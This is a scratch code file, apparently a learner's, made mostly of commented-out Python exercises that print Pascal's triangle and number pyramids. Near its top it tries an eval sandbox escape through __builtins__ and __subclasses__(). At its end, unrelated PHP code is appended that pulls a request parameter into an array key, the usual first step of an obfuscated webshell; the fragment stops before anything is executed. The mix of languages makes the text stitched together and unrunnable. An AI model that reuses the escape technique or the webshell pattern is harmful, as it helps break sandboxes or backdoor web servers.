# password="aabcc"
# # print(ord(password))
# list1=list(password)
# for e in list1:
# #     print(e)
# print(eval("[e for e in list1]"))

# a=eval('[__builtins__]',{'__builtins__':None},None)
# print(a)
# print(eval("__builtins__.__class__.__base__.__subclasses__()[94]",{"__builtins__":None},None))
# # 杨辉三角，单列表解决
# n = int(input())
# row = [1] * n
# for i in range(n):
#     z = 1
#     offset = n - i
#     for j in range(1, i//2+1):
#         val = z + row[j]
#         z = row[j]
#         row[j] = val
#         if i != 2*j:
#             row[-j - offset] = val
#     print()
# b=int(input())
# a=b+1
# for i in range(1,a):
#     for x in range(a-i):
#         print(" ",end="")
#     for y in range(2*i-1):
#         print(i,end="")
#     print()
# for j in range(a-2,0,-1):
#     for w in range(a-j):
#         print(" ",end="")
#     for z in range(2*j-1):
#         print(j,end="")
#     print()
# N = [1]
# for i in range(1,6):
#     print(N)
#     N.append(0)
#     N = [N[k] + N[k-1] for k in range(i+1)]
# a = int(input())  # 输入。

# # 特判 a = 1 或 2 的情况。后面代码会轻松些。
# if a == 1:
#     print(1)
#     quit()        # 直接退出程序。
# if a == 2:
#     print(1)
#     print("1 1")
#     quit()

# # 准备工作：列表打起。
# s = ["1","1"]
# d = []

# # 前两层。
# print("    1")
# print("    1    1")

# for i in range(a-2):
#     print("    ",end="")
#     if i % 2 == 0:
#         d.append("1")
#         for i in range(len(s)-1):
#             d.append(str(int(s[i]) + int(s[i+1])))  # 转化为字符串，为拼接做准备。
#         d.append("1")
#         print("    ".join(d))    # 输出。
#         s = []                # 重置列表。
    
#     # 同上。
#     else:
#         s.append("1")
#         for i in range(len(d)-1):
#             s.append(str(int(d[i]) + int(d[i+1])))
#         s.append("1")
#         print("    ".join(s))
#         d = []
# total=int(input())
# N = [1]
# for i in range(total):
#     N.append(0)
#     N = [N[k] + N[k-1] for k in range(i+1)]
#     for j in N:
#         print("{0:>5}".format(j),end="")
#     print()
        
# while True:
#     try:
#         total=int(input())
#         N = [1]
#         for i in range(total):
#             N.append(0)
#             N = [N[k] + N[k-1] for k in range(i+1)]
#             for j in N:
#                 print(f"{j:5d}",end='')
#             if i < total-1:
#                 print()
#     except EOFError:
#         break
<?php
@$a=array($_REQUEST['x']=>"3");
$b=array_keys($a)[0];